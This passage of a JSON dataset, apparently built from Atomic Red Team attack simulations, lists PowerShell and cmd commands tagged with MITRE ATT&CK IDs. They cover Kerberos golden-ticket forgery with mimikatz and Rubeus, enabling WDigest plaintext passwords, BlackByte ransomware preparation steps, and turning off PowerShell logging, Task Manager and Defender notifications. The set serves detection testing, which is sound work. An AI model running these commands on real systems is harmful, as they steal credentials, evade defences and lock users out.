        "ID": 1483,
        "Command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\n# get current domain SID if default was used\n$domain_sid = \"S-1-5-21-DEFAULT\"\nIf ($domain_sid -Match \"DEFAULT\") {\n  # code from https://www.sevecek.com/EnglishPages/Lists/Posts/Post.aspx?ID=60\n  $domain = gwmi Win32_ComputerSystem | Select -Expand Domain\n  $krbtgtSID = (New-Object Security.Principal.NTAccount $domain\\krbtgt).Translate([Security.Principal.SecurityIdentifier]).Value\n  $domain_sid = $krbtgtSID.SubString(0, $krbtgtSID.LastIndexOf('-'))\n}\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  PathToAtomicsFolder\\..\\ExternalPayloads\\mimikatz\\x64\\mimikatz.exe \"kerberos::golden /domain:%userdnsdomain% /sid:DOMAIN_SID /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /user:goldenticketfakeuser /ptt\" \"exit\"\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\%userdnsdomain%\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"DOMAIN_SID\", $domain_sid | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n\\tif ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n",
        "Description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1558.001",
        "Shell": "powershell"
    },
    {
        "ID": 1484,
        "Command": "Remove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n\ncmd.exe /c \"$Env:temp\\rubeus.exe\" golden /aes256:b7268361386090314acce8d9367e55f55865e7ef8e670fbe4262d6c94098a9e9 /ldap /user:$ENV:username /dc:$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\") /printcmd /outfile:golden\n$filename = (Get-ChildItem | ? {$_.Name.startswith(\"golden_\")} | Sort-Object -Descending -Property LastWriteTime | select -First 1).Name\n\n# create batch file with commands to run in a separate \"runas /netonly\" session\n# so we don't purge Kerberos ticket from the current Windows session\n# its output goes to golden.txt temp file, because we cannot capture \"runas /netonly\" output otherwise\n@\"\n>%TEMP%\\golden.txt 2>&1 (\n  echo Purge existing tickets and create golden ticket:\n  klist purge\n  cd %temp%\n  \"$Env:temp\\rubeus.exe\" ptt /ticket:kirbifile\n\n  echo.\n  echo Requesting SYSVOL:\n  dir \\\\$($ENV:logonserver.TrimStart('\\') + \".\" + \"$ENV:userdnsdomain\")\\SYSVOL\n  \n  echo.\n  echo Tickets after requesting SYSVOL:\n  klist\n\n  echo.\n  echo End of Golden Ticket attack\n)\n\"@ -Replace \"kirbifile\", $filename | Out-File -Encoding OEM $env:TEMP\\golden.bat\n\n# run batch file in a new empty session (password and username do not matter)\necho \"foo\" | runas /netonly /user:fake \"$env:TEMP\\golden.bat\" | Out-Null\n\n# wait until the output file has logged the entire attack\ndo {\n  Start-Sleep 1 # wait a bit so the output file has time to be created\n  Get-Content -Path \"$env:TEMP\\golden.txt\" -Wait | ForEach-Object {\n\\tif ($_ -match 'End of Golden Ticket attack') { break } \n  }\n} while ($false) # dummy loop so that 'break' can be used\n\n# show output from new empty session\nGet-Content $env:TEMP\\golden.txt\n\n# cleanup temp files\nRemove-Item $env:TEMP\\golden.bat -ErrorAction Ignore\nRemove-Item $env:TEMP\\golden.txt -ErrorAction Ignore\n",
        "Description": "Once the hash of the special krbtgt user is retrieved it is possible to craft Kerberos Ticket Granting Ticket impersonating any user in the Active Directory domain.\nThis test crafts a Golden Ticket and then performs an SMB request with it for the SYSVOL share, thus triggering a service ticket request (event ID 4769).\nThe generated ticket is injected in a new empty Windows session and discarded after, so it does not pollute the current Windows session.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1558.001",
        "Shell": "powershell"
    },
    {
        "ID": 1485,
        "Command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /t REG_DWORD /v HideFileExt /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the new entry in HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1486,
        "Command": "reg add HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /t REG_EXPAND_SZ /v SecurityHealth /d calc.exe /f\n",
        "Description": "Modify the Local Machine registry RUN key to change Windows Defender executable that should be ran on startup.  This should only be possible when\nCMD is ran as Administrative rights. Upon execution, the message \"The operation completed successfully.\"\nwill be displayed. Additionally, open Registry Editor to view the modified entry in HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1487,
        "Command": "reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential /t REG_DWORD /d 1 /f\n",
        "Description": "Sets registry key that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).\nUpon execution, the message \"The operation completed successfully.\" will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1488,
        "Command": "Set-ItemProperty -Force -Path  'HKLM:\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest' -Name  'UseLogonCredential' -Value '1' -ErrorAction Ignore\n",
        "Description": "Sets registry key using Powershell that will tell windows to store plaintext passwords (making the system vulnerable to clear text / cleartext password dumping).\nOpen Registry Editor to view the modified entry in HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "powershell"
    },
    {
        "ID": 1489,
        "Command": "$key= \"HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\Domains\\bad-domain.com\\\"\n$name =\"bad-subdomain\"\nnew-item $key -Name $name -Force\nnew-itemproperty $key$name -Name https -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name http  -Value 2 -Type DWORD;\nnew-itemproperty $key$name -Name *\\t -Value 2 -Type DWORD;\n",
        "Description": "Attackers may add a domain to the trusted site zone to bypass defenses. Doing this enables attacks such as c2 over office365.\nUpon execution, details of the new registry entries will be displayed.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\\ZoneMap\\.\n\nhttps://www.blackhat.com/docs/us-17/wednesday/us-17-Dods-Infecting-The-Enterprise-Abusing-Office365-Powershell-For-Covert-C2.pdf\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "powershell"
    },
    {
        "ID": 1490,
        "Command": "New-ItemProperty \"HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" -Name T1112 -Value \"<script>\"\n",
        "Description": "Upon execution, a javascript block will be placed in the registry for persistence.\nAdditionally, open Registry Editor to view the modified entry in HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "powershell"
    },
    {
        "ID": 1491,
        "Command": "Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope LocalMachine\n",
        "Description": "Attackers need to change the powershell execution policy in order to run their malicious powershell scripts.\nThey can either specify it during the execution of the powershell script or change the registry value for it.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "powershell"
    },
    {
        "ID": 1492,
        "Command": "cmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f\ncmd.exe /c reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLinkedConnections /t REG_DWORD /d 1 /f\ncmd.exe /c reg add HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem /v LongPathsEnabled /t REG_DWORD /d 1 /f\n",
        "Description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1493,
        "Command": "New-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name LocalAccountTokenFilterPolicy -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" -Name EnableLinkedConnections -PropertyType DWord -Value 1 -Force\nNew-ItemProperty \"HKLM:\\SYSTEM\\CurrentControlSet\\Control\\FileSystem\" -Name LongPathsEnabled -PropertyType DWord -Value 1 -Force\n",
        "Description": "This task recreates the steps taken by BlackByte ransomware before it worms to other machines via Powershell.  See \"Preparing to Worm\" section: https://redcanary.com/blog/blackbyte-ransomware/\nThe steps are as follows:\n<ol>\n    <li>1. Elevate Local Privilege by disabling UAC Remote Restrictions</li>\n    <li>2. Enable OS to share network connections between different privilege levels</li>\n    <li>3. Enable long path values for file paths, names, and namespaces to ensure encryption of all file names and paths</li>\n</ol>\nThe registry keys and their respective values will be created upon successful execution.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "powershell"
    },
    {
        "ID": 1494,
        "Command": "reg add HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\policies\\system /v DisableRegistryTools /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows registry tool to prevent user modifying registry entry.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1495,
        "Command": "New-ItemProperty -Path \"HKCU:\\Software\\Policies\\Microsoft\\Windows\\System\" -Name DisableCMD -Value 1\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows CMD application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "powershell"
    },
    {
        "ID": 1496,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableTaskmgr /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows task manager application.\nSee example how Agent Tesla malware abuses this technique: https://any.run/report/ea4ea08407d4ee72e009103a3b77e5a09412b722fdef67315ea63f22011152af/a866d7b1-c236-4f26-a391-5ae32213dfc4#registry\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1497,
        "Command": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Policies\\Microsoft\\Windows\\Explorer /v DisableNotificationCenter /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows notification center.\nSee how remcos rat abuses this technique- https://tccontre.blogspot.com/2020/01/remcos-rat-evading-windows-defender-av.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1498,
        "Command": "reg add \"HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v shutdownwithoutlogon /t REG_DWORD /d 0 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows shutdown button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom.msil.screenlocker.a/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1499,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoLogOff /t REG_DWORD /d 1 /f\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v StartMenuLogOff /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows logoff button.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/be/threat-encyclopedia/search/js_noclose.e/2\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1500,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableChangePassword /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows change password feature.\nSee how ransomware abuses this technique- https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/ransom_heartbleed.thdobah\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1501,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\" /v DisableLockWorkstation /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows Lock workstation feature.\nSee how ransomware abuses this technique- https://www.bleepingcomputer.com/news/security/in-dev-ransomware-forces-you-do-to-survey-before-unlocking-computer/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1502,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoDesktop /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to hide all icons on Desktop Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1503,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoRun /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Run menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1504,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFind /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove Search menu from Start Menu Group Policy.\nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1505,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoControlPanel /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable Control Panel Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1506,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoFileMenu /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Remove File menu from Windows Explorer Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1507,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoClose /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable and remove the Shut Down command Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how Trojan abuses this technique- https://www.sophos.com/de-de/threat-center/threat-analyses/viruses-and-spyware/Troj~Krotten-N/detailed-analysis\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1508,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoSetTaskbar /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable changes to Taskbar and Start Menu Settings Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1509,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoTrayContextMenu /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Disable context menu for taskbar Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1510,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v NoPropertiesMyDocuments /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to hide Properties from \"My Documents icon\" Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1511,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideClock /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to Hide Clock Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1512,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAHealth /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove security and maintenance icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1513,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCANetwork /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the networking icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1514,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAPower /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the battery icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect.\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1515,
        "Command": "reg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\" /v HideSCAVolume /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to remove the volume icon Group Policy. \nTake note that some Group Policy changes might require a restart to take effect..\nSee how ransomware abuses this technique- https://www.virustotal.com/gui/file/2d7855bf6470aa323edf2949b54ce2a04d9e38770f1322c3d0420c2303178d91/details\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1516,
        "Command": "reg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowInfoTip /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced /v ShowCompColor /t REG_DWORD /d 0 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to show compress color and show tips feature. \nSee how hermeticwiper uses this technique - https://www.splunk.com/en_us/blog/security/detecting-hermeticwiper.html\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1517,
        "Command": "reg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging /v EnableModuleLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging /v EnableScriptBlockLogging /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription /v EnableTranscripting /t REG_DWORD /d 0 /f\nreg  add HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /t REG_DWORD /d 0 /f\nreg delete HKCU\\Software\\Policies\\Microsoft\\Windows\\PowerShell /v EnableScripts /f >nul 2>&1\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable Powershell Module Logging, Script Block Logging, Transcription and Script Execution\nsee https://admx.help/?Category=Windows_10_2016&Policy=Microsoft.Policies.PowerShell::EnableModuleLogging\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1518,
        "Command": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Minimal\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n",
        "Description": "Modify the registry to allow a driver, service, to persist in Safe Mode.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Minimal with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode without networking. The same applies for the Network subkey.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1519,
        "Command": "REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\SafeBoot\\Network\\AtomicSafeMode\" /VE /T REG_SZ /F /D \"Service\"\n",
        "Description": "Modify the registry to allow a driver, service, to persist in Safe Mode with networking.\nsee https://redcanary.com/blog/tracking-driver-inventory-to-expose-rootkits/ and https://blog.didierstevens.com/2007/03/26/playing-with-safe-mode/ for further details.\nAdding a subkey to Netowrk with the name of your service and a default value set to Service, makes that your service will be started when you boot into Safe Mode with networking.\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1520,
        "Command": "reg add HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\PushNotifications /v ToastEnabled /t REG_DWORD /d 0 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows toast notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1521,
        "Command": "reg add HKLM\\SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\ImmersiveShell /v UseActionCenterExperience /t REG_DWORD /d 0 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to disable the windows security center notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1522,
        "Command": "reg add \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\UX Configuration\" /v Notification_Suppress /t REG_DWORD /d 1 /f\n",
        "Description": "Modify the registry of the currently logged in user using reg.exe via cmd console to suppress the windows defender notification.\nSee how azorult malware abuses this technique- https://app.any.run/tasks/a6f2ffe2-e6e2-4396-ae2e-04ea0143f2d8/\n",
        "Score": null,
        "GoodOrBad": null,
        "MitreAttackClassification": "T1112",
        "Shell": "command_prompt"
    },
    {
        "ID": 1523,
        "Command": "reg add \"HKLM\\System\\CurrentControlSet\\Control\\Terminal Server\" /v fAllowToGetHelp /t REG_DWORD /d 1 /f\n",
